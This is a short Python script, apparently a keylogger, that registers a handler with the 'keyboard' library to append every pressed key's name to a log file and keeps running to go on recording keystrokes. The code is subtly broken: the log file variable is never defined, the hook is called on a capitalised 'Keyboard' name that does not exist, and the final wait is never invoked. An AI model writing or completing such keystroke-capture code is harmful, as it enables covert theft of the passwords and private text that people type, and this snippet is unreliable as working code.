import keyboard


def on_key_press(event):
    with open(log_file, "a") as f:
        f.write(event.name)

Keyboard.on_press(on_key_press)

# Keep the program running to continue to logging keystrokes
keyboard.wait